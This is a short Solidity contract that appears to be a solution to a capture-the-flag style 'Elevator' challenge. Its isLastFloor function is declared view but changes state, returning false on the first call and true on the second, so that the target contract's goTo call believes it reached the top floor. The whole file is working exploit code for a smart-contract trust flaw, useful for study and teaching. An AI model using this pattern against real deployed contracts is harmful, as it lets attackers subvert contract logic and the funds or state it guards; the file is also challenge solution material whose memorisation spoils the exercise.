pragma solidity ^0.4.18;

import './Elevator.sol';

contract MyBuilding is Building {    //this exploit will only work once on the contract, but that's all we need
    bool called = false;
    Elevator public elevator;
    
    constructor() public {
        elevator = Elevator(/* CONTRACT ADDRESS */);
    }

    /* Currently, the Solidity compiler does nothing to enforce that a view or constant function is not modifying state. The same applies to pure functions, which should not read state but they can. Make sure you read Solidity's documentation and learn its caveats. */
    function isLastFloor(uint _floor) view public returns (bool) { 
        bool previous = called;
        called = true;
        return previous;
    }
    
    function exploit() public {
        elevator.goTo(1);   
    } 
}